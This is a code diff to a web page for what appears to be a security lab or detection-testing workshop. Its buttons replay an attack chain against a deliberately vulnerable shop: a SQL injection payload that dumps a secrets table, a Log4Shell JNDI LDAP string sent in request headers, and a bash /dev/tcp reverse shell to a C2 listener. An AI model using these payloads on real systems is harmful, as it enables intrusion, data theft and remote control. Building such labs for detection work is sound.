@@ -20,15 +20,16 @@
     <p class="lede">
       Critical VM Compromise on a host sensor’d box:
       <strong>SQL injection → Log4Shell → reverse shell to external C2</strong>.
+      SQLi and Log4Shell PoCs hit the real shop <code>/search</code> path (same as manual browsing).
+      Reverse shell stays process-level (<code>bash /dev/tcp</code>).
     </p>
 
     <section class="card-ish">
       <p class="badge">Story · Critical VM Compromise</p>
       <h2>Full chain</h2>
       <p>
-        Runs all three steps with short gaps so detections can split cleanly.
-        Log4Shell defaults to <strong>on-box</strong> LDAP (<code>127.0.0.1:1389</code>) —
-        no laptop firewall ports required. Point C2 at a host the VM can reach.
+        Browser replays shop <code>/search</code> for SQLi + Log4Shell, then reverse shell.
+        Leave LDAP/C2 at <code>127.0.0.1</code> for on-box listeners.
       </p>
       <label for="ldap">Log4Shell LDAP callback (host:port)</label>
       <input id="ldap" type="text" value="127.0.0.1:1389" />
@@ -38,9 +39,9 @@
         <button id="run-chain" type="button">Run Critical VM Compromise</button>
       </div>
       <ol class="steps">
-        <li>Leave LDAP + C2 at <code>127.0.0.1</code> — on-box attackers start at boot.</li>
-        <li>Optional external C2: <code>python3 tools/c2-listen.py --port 4444</code> on a reachable host.</li>
-        <li>Optional laptop LDAP: <code>./tools/run-log4shell-ldap.sh --codebase-host YOUR_IP</code> (needs inbound 1389+8000).</li>
+        <li>SQLi: <code>GET /search?q=' UNION…</code></li>
+        <li>Log4Shell: <code>GET /search</code> with JNDI in <code>User-Agent</code></li>
+        <li>Reverse shell: <code>bash /dev/tcp</code> to C2 (process signal)</li>
       </ol>
       <pre id="chain-result" class="result" hidden></pre>
     </section>
@@ -49,8 +50,7 @@
       <p class="badge">Step 1 · CWE-89</p>
       <h2>SQL injection</h2>
       <p>
-        UNION SELECT against the SQLite catalog dumps workshop secrets.
-        PoC replays the real <code>GET /search?q=…</code> shop request (same path as typing it in the UI).
+        Replays real <code>GET /search?q=…</code> (same as typing it in the shop UI).
       </p>
       <div class="row">
         <button id="run-sqli" type="button">Run SQLi</button>
@@ -62,9 +62,8 @@
       <p class="badge">Step 2 · CVE-2021-44228</p>
       <h2>Log4Shell (full RCE)</h2>
       <p>
-        JNDI LDAP → remote <code>Exploit.class</code>. Default callback
-        <code>127.0.0.1:1389</code> uses the on-box attacker started at boot.
-        Success creates <code>/tmp/jss-log4shell-rce</code> on the VM.
+        Replays <code>GET /search</code> with JNDI in <code>User-Agent</code> / <code>X-Api-Version</code>
+        (same sinks as manual shop traffic). On-box LDAP at <code>127.0.0.1:1389</code>.
       </p>
       <div class="row">
         <button id="run-log4j" type="button">Run Log4Shell</button>
@@ -75,7 +74,7 @@
     <section class="card-ish" style="margin-top:1.25rem">
       <p class="badge">Step 3 · Reverse shell</p>
       <h2>Outbound shell to C2</h2>
-      <p>Short-lived <code>bash /dev/tcp</code> dial to your listener (workshop-safe timeout).</p>
+      <p>Short-lived <code>bash /dev/tcp</code> dial (process/network signal — not an HTTP path).</p>
       <div class="row">
         <button id="run-rev" type="button">Run reverse shell</button>
       </div>
@@ -87,6 +86,10 @@
 
   <script>
     const SQLI_PAYLOAD = "' UNION SELECT id,k,v,v FROM secrets--";
+
+    function jndiPayload(ldap) {
+      return "${jndi:ldap://" + ldap + "/TraditionalJay}";
+    }
 
     async function postJson(url, resultId) {
       const el = document.getElementById(resultId);
@@ -101,7 +104,7 @@
       }
     }
 
-    // Same HTTP as typing SQLi into the shop search box (client → GET /search?q=…).
+    // Same HTTP as typing SQLi into the shop search box.
     async function replayShopSqli() {
       const url = "/search?q=" + encodeURIComponent(SQLI_PAYLOAD);
       await fetch(url, {
@@ -110,6 +113,23 @@
         credentials: "same-origin",
       });
       return url;
+    }
+
+    // Same HTTP as Log4Shell via shop — JNDI in headers that /search logs with Log4j.
+    async function replayShopLog4shell(ldap) {
+      const payload = jndiPayload(ldap);
+      const url = "/search?q=" + encodeURIComponent("boards");
+      await fetch(url, {
+        method: "GET",
+        headers: {
+          "Accept": "text/html",
+          "User-Agent": payload,
+          "X-Api-Version": payload,
+          "Referer": payload,
+        },
+        credentials: "same-origin",
+      });
+      return { url, payload };
     }
 
     document.getElementById('run-sqli').addEventListener('click', async () => {
@@ -129,28 +149,51 @@
         el.textContent = String(err);
       }
     });
-    document.getElementById('run-log4j').addEventListener('click', () => {
-      const ldap = document.getElementById('ldap').value.trim();
-      postJson("/api/demo/log4shell?callback=" + encodeURIComponent(ldap), "log4j-result");
+
+    document.getElementById('run-log4j').addEventListener('click', async () => {
+      const el = document.getElementById('log4j-result');
+      el.hidden = false;
+      el.textContent = 'Running…';
+      try {
+        const ldap = document.getElementById('ldap').value.trim();
+        const shop = await replayShopLog4shell(ldap);
+        const res = await fetch(
+          "/api/demo/log4shell?callback=" + encodeURIComponent(ldap) + "&via=search",
+          { method: "POST" }
+        );
+        const data = await res.json();
+        data.browser_http = shop.url;
+        data.browser_user_agent = shop.payload;
+        el.textContent = JSON.stringify(data, null, 2);
+      } catch (err) {
+        el.textContent = String(err);
+      }
     });
+
     document.getElementById('run-rev').addEventListener('click', () => {
       const c2 = document.getElementById('c2').value.trim();
       postJson("/api/demo/reverse-shell?callback=" + encodeURIComponent(c2), "rev-result");
     });
+
     document.getElementById('run-chain').addEventListener('click', async () => {
       const el = document.getElementById('chain-result');
       el.hidden = false;
       el.textContent = 'Running…';
       try {
-        await replayShopSqli();
         const ldap = document.getElementById('ldap').value.trim();
         const c2 = document.getElementById('c2').value.trim();
+        const sqliUrl = await replayShopSqli();
+        await new Promise((r) => setTimeout(r, 1500));
+        const log4j = await replayShopLog4shell(ldap);
+        await new Promise((r) => setTimeout(r, 1500));
         const url = "/api/demo/critical-vm-compromise"
           + "?ldap_callback=" + encodeURIComponent(ldap)
           + "&c2_callback=" + encodeURIComponent(c2);
         const res = await fetch(url, { method: "POST" });
         const data = await res.json();
-        data.browser_sqli_http = "/search?q=" + encodeURIComponent(SQLI_PAYLOAD);
+        data.browser_sqli_http = sqliUrl;
+        data.browser_log4shell_http = log4j.url;
+        data.browser_log4shell_user_agent = log4j.payload;
         el.textContent = JSON.stringify(data, null, 2);
       } catch (err) {
         el.textContent = String(err);
